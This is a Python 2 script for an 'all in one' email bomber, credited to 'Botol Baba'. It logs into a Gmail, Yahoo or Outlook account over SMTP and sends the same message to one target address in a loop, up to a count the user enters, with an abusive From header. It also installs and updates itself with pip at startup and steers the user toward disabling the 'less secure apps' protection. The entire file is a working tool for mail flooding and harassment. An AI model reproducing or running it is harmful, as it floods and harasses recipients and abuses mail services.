#coding=utf-8
#!/usr/bin/python

import smtplib, time, os, getpass, sys

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        
class bcolors:
	OKGREEN = '\033[1;92;40m'
	WARNING = '\033[96m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	WHAT = '\033[1;92m'


def bababomb():
	os.system('clear')
	print bcolors.WHAT + '''
 _______ _________ _______  _______ _________
(  ____ \\__   __/(  ___  )(  ____ )\__   __/
| (    \/   ) (   | (   ) || (    )|   ) (   
| (_____    | |   | (___) || (____)|   | |   
(_____  )   | |   |  ___  ||     __)   | |   
      ) |   | |   | (   ) || (\ (      | |   
/\____) |   | |   | )   ( || ) \ \__   | |   
\_______)   )_(   |/     \||/   \__/   )_(   
                                             \n\n\n''' + bcolors.ENDC


def bain():
	os.system('clear')
	os.system("pip2 install --upgrade bain")
	os.system('clear')
	print(u"\u001b[38;5;198m"' ______   _______ _________ _       ')
	print(u"\u001b[38;5;197m"'(  ___ \ (  ___  )\__   __/( (    /|')
	print(u"\u001b[38;5;198m"'| (   ) )| (   ) |   ) (   |  \  ( |')
	print(u"\u001b[38;5;197m"'| (__/ / | (___) |   | |   |   \ | |')
	print(u"\u001b[38;5;198m"'|  __ (  |  ___  |   | |   | (\ \) |')
	print(u"\u001b[38;5;197m"'| (  \ \ | (   ) |   | |   | | \   |')
	print(u"\u001b[38;5;198m"'| )___) )| )   ( |___) (___| )  \  |')
	print(u"\u001b[38;5;197m"'|/ \___/ |/     \|\_______/|/    )_)')
	print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
        print(40 * "\033[1;94m_")
        print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
        print(40 * "\033[1;94m_")
        print(u"\u001b[38;5;135m"'\nSELECT SERVER :\n')
        psb(u"\u001b[38;5;36m""     [01]  GMAIL BOMBER")
        psb(u"\u001b[38;5;37m""     [02]  YAHOO BOMBER")
        psb(u"\u001b[38;5;38m""     [03]  HOTMAIL BOMBER")
        psb(u"\u001b[38;5;39m""     [04]  UPDATE TOOL")
        psb(u"\u001b[38;5;33m""     [00]  EXIT NOW")
        baction()
    

def baction():
	babaserver = raw_input(bcolors.OKGREEN + (u"\u001b[38;5;135m"'\n   >  ') + bcolors.ENDC)
	if babaserver =='':
		print '[!] Fill in correctly'
		baction()
	elif babaserver =="1" or babaserver == '01':
			os.system('clear')
			print(u"\u001b[38;5;198m"' ______   _______ _________ _       ')
			print(u"\u001b[38;5;197m"'(  ___ \ (  ___  )\__   __/( (    /|')
			print(u"\u001b[38;5;198m"'| (   ) )| (   ) |   ) (   |  \  ( |')
			print(u"\u001b[38;5;197m"'| (__/ / | (___) |   | |   |   \ | |')
			print(u"\u001b[38;5;198m"'|  __ (  |  ___  |   | |   | (\ \) |')
			print(u"\u001b[38;5;197m"'| (  \ \ | (   ) |   | |   | | \   |')
			print(u"\u001b[38;5;198m"'| )___) )| )   ( |___) (___| )  \  |')
			print(u"\u001b[38;5;197m"'|/ \___/ |/     \|\_______/|/    )_)')
			print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
			print(40 * "\033[1;94m_")
			print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
			print(40 * "\033[1;94m_")
			user = raw_input(bcolors.OKGREEN + '\n   \033[1;91m•\033[1;92mYOUR EMAIL  \033[1;93m: ' + bcolors.ENDC)
			pwd = getpass.getpass(bcolors.OKGREEN + '   \033[1;91m•\033[1;92mPASSWORD    \033[1;93m: ' + bcolors.ENDC)
			os.system('clear')
			print(u"\u001b[38;5;198m"' ______   _______ _________ _       ')
			print(u"\u001b[38;5;197m"'(  ___ \ (  ___  )\__   __/( (    /|')
			print(u"\u001b[38;5;198m"'| (   ) )| (   ) |   ) (   |  \  ( |')
			print(u"\u001b[38;5;197m"'| (__/ / | (___) |   | |   |   \ | |')
			print(u"\u001b[38;5;198m"'|  __ (  |  ___  |   | |   | (\ \) |')
			print(u"\u001b[38;5;197m"'| (  \ \ | (   ) |   | |   | | \   |')
			print(u"\u001b[38;5;198m"'| )___) )| )   ( |___) (___| )  \  |')
			print(u"\u001b[38;5;197m"'|/ \___/ |/     \|\_______/|/    )_)')
			print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
			print(40 * "\033[1;94m_")
			print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
			print(40 * "\033[1;94m_")
			to = raw_input(bcolors.OKGREEN + '\n   TO : ' + bcolors.ENDC)
			headers = (' BOTOL BABA FUCK YOU ')
			subject = raw_input(bcolors.OKGREEN + '   SUBJECT : ' + bcolors.ENDC)
			body = raw_input(bcolors.OKGREEN + '   MESSAGE : ' + bcolors.ENDC)
			nomes = input(bcolors.OKGREEN + '   THREAT : ' + bcolors.ENDC)
			no = 0
			message = 'From: ' + user + headers + '\nSUBJECT : ' + subject + '\n' + body
			bababomb()
			babaserver = smtplib.SMTP("smtp.gmail.com", 587)
			babaserver.ehlo()
			babaserver.starttls()
			try:
				babaserver.login(user, pwd)
			except smtplib.SMTPAuthenticationError:
				print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
				Or you need to enable less secure apps
				On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
				os.system('xdg-open https://myaccount.google.com/lesssecureapps')
				sys.exit()
			while no != nomes:
				try:
					babaserver.sendmail(user, to, message)
					print bcolors.WARNING + 'SUCCESSFULLY SENT ' + str(no+1) + ' MAIL' + bcolors.ENDC
					no += 1
					time.sleep(.2)
				except KeyboardInterrupt:
					print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
					sys.exit()
				except:
					print "FAILED TO SEND"
					raw_input("\n[ Back ]")
					bain()
	elif babaserver == '2' or babaserver == '02':
		os.system('clear')
		print(u"\u001b[38;5;191m"' ______   _______ _________ _       ')
		print(u"\u001b[38;5;192m"'(  ___ \ (  ___  )\__   __/( (    /|')
		print(u"\u001b[38;5;132m"'| (   ) )| (   ) |   ) (   |  \  ( |')
		print(u"\u001b[38;5;133m"'| (__/ / | (___) |   | |   |   \ | |')
		print(u"\u001b[38;5;137m"'|  __ (  |  ___  |   | |   | (\ \) |')
		print(u"\u001b[38;5;199m"'| (  \ \ | (   ) |   | |   | | \   |')
		print(u"\u001b[38;5;197m"'| )___) )| )   ( |___) (___| )  \  |')
		print(u"\u001b[38;5;198m"'|/ \___/ |/     \|\_______/|/    )_)')
		print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
		print(40 * "\033[1;94m_")
		print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
		print(40 * "\033[1;94m_")
		user = raw_input(bcolors.OKGREEN + '\n   \033[1;91m•\033[1;92mYOUR EMAIL  \033[1;93m: ' + bcolors.ENDC)
		pwd = getpass.getpass(bcolors.OKGREEN + '   \033[1;91m•\033[1;92mPASSWORD    \033[1;93m: ' + bcolors.ENDC)
		os.system('clear')
		print(u"\u001b[38;5;191m"' ______   _______ _________ _       ')
		print(u"\u001b[38;5;192m"'(  ___ \ (  ___  )\__   __/( (    /|')
		print(u"\u001b[38;5;132m"'| (   ) )| (   ) |   ) (   |  \  ( |')
		print(u"\u001b[38;5;133m"'| (__/ / | (___) |   | |   |   \ | |')
		print(u"\u001b[38;5;137m"'|  __ (  |  ___  |   | |   | (\ \) |')
		print(u"\u001b[38;5;199m"'| (  \ \ | (   ) |   | |   | | \   |')
		print(u"\u001b[38;5;197m"'| )___) )| )   ( |___) (___| )  \  |')
		print(u"\u001b[38;5;198m"'|/ \___/ |/     \|\_______/|/    )_)')
		print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
		print(40 * "\033[1;94m_")
		print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
		print(40 * "\033[1;94m_")
		to = raw_input(bcolors.OKGREEN + '\n   TO : ' + bcolors.ENDC)
		headers = (' BOTOL BABA FUCK YOU ')
		subject = raw_input(bcolors.OKGREEN + '   SUBJECT : ' + bcolors.ENDC)
		body = raw_input(bcolors.OKGREEN + '   MESSAGE : ' + bcolors.ENDC)
		nomes = input(bcolors.OKGREEN + '   THREAT : ' + bcolors.ENDC)
		no = 0
		message = 'From: ' + user + headers + '\nSUBJECT : ' + subject + '\n' + body
		bababomb()
		babaserver = smtplib.SMTP("smtp.mail.yahoo.com", 587)
		babaserver.ehlo()
		babaserver.starttls()
		try:
			babaserver.login(user, pwd)
		except smtplib.SMTPAuthenticationError:
			print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
			Or you need to enable less secure apps
			On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
			''' + bcolors.ENDC
			os.system('xdg-open https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps')
			sys.exit()
		while no != nomes:
			try:
				babaserver.sendmail(user, to, message)
				print bcolors.WARNING + 'SUCCESSFULLY SENT ' + str(no + 1) + ' MAIL' + bcolors.ENDC
				no += 1
				time.sleep(.2)
			except KeyboardInterrupt:
				print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
				sys.exit()
			except:
				print "FAILED TO SEND"
				raw_input("\n[ Back ]")
				bain()
	elif babaserver == '3' or babaserver == '03':
		os.system('clear')
		print(u"\u001b[38;5;191m"' ______   _______ _________ _       ')
		print(u"\u001b[38;5;192m"'(  ___ \ (  ___  )\__   __/( (    /|')
		print(u"\u001b[38;5;132m"'| (   ) )| (   ) |   ) (   |  \  ( |')
		print(u"\u001b[38;5;133m"'| (__/ / | (___) |   | |   |   \ | |')
		print(u"\u001b[38;5;137m"'|  __ (  |  ___  |   | |   | (\ \) |')
		print(u"\u001b[38;5;199m"'| (  \ \ | (   ) |   | |   | | \   |')
		print(u"\u001b[38;5;197m"'| )___) )| )   ( |___) (___| )  \  |')
		print(u"\u001b[38;5;198m"'|/ \___/ |/     \|\_______/|/    )_)')
		print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
		print(40 * "\033[1;94m_")
		print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
		print(40 * "\033[1;94m_")
		user = raw_input(bcolors.OKGREEN + '\n   \033[1;91m•\033[1;92mYOUR EMAIL  \033[1;93m: ' + bcolors.ENDC)
		pwd = getpass.getpass(bcolors.OKGREEN + '   \033[1;91m•\033[1;92mPASSWORD    \033[1;93m: ' + bcolors.ENDC)
		os.system('clear')
		print(u"\u001b[38;5;191m"' ______   _______ _________ _       ')
		print(u"\u001b[38;5;192m"'(  ___ \ (  ___  )\__   __/( (    /|')
		print(u"\u001b[38;5;132m"'| (   ) )| (   ) |   ) (   |  \  ( |')
		print(u"\u001b[38;5;133m"'| (__/ / | (___) |   | |   |   \ | |')
		print(u"\u001b[38;5;137m"'|  __ (  |  ___  |   | |   | (\ \) |')
		print(u"\u001b[38;5;199m"'| (  \ \ | (   ) |   | |   | | \   |')
		print(u"\u001b[38;5;197m"'| )___) )| )   ( |___) (___| )  \  |')
		print(u"\u001b[38;5;198m"'|/ \___/ |/     \|\_______/|/    )_)')
		print('''\n     \033[1;90mALL IN ONE BOMBER BY \033[1;92mBOTOL BABA''')
		print(40 * "\033[1;94m_")
		print('''\n\033[1;96mAUTHOR     : MEHEDI HASAN ARIYAN\nFACEBOOK   : FACEBOOK.COM/THEMEHTAN\nYOUTUBE    : YOUTUBE.COM/MASTERTRICK1\nGITHUB     : GITHUB.COM/BOTOLMEHEDI''')
		print(40 * "\033[1;94m_")
		to = raw_input(bcolors.OKGREEN + '\n   TO : ' + bcolors.ENDC)
		headers = (' BOTOL BABA FUCK YOU ')
		subject = raw_input(bcolors.OKGREEN + '   SUBJECT : ' + bcolors.ENDC)
		body = raw_input(bcolors.OKGREEN + '   MESSAGE : ' + bcolors.ENDC)
		nomes = input(bcolors.OKGREEN + '   THREAT : ' + bcolors.ENDC)
		no = 0
		message = 'From: ' + user + headers + '\nSUBJECT : ' + subject + '\n' + body
		bababomb()
		babaserver = smtplib.SMTP("smtp-mail.outlook.com", 587)
		babaserver.ehlo()
		babaserver.starttls()
		try:
			babaserver.login(user, pwd)
		except smtplib.SMTPAuthenticationError:
			print bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC
			sys.exit()
		while no != nomes:
			try:
				babaserver.sendmail(user, to, message)
				print bcolors.WARNING + 'SUCCESSFULLY SENT ' + str(no + 1) + ' MAIL' + bcolors.ENDC
				no += 1
				time.sleep(.2)
			except KeyboardInterrupt:
				print bcolors.FAIL + '\nCANCELED' + bcolors.ENDC
				sys.exit()
			except smtplib.SMTPAuthenticationError:
				print '\nThe username or password you entered is incorrect.'
				sys.exit()
			except:
				print "FAILED TO SEND "
				raw_input("\n[ Back ]")
				bain()
	elif babaserver == '4' or babaserver == '04':
		os.system("pip2 install --upgrade bain")
	elif babaserver == '0' or babaserver == '00':
		sys.exit()
	elif babaserver == '5' or babaserver == '6' or babaserver == '7' or babaserver == '8':
		print '  Works only with Gmail, Yahoo, Outlook and Hotmail. '
		os.system('xdg-open https://facebook.com/TheMehtan')
		os.system("bain")
	




if __name__ == '__main__':
	bain()


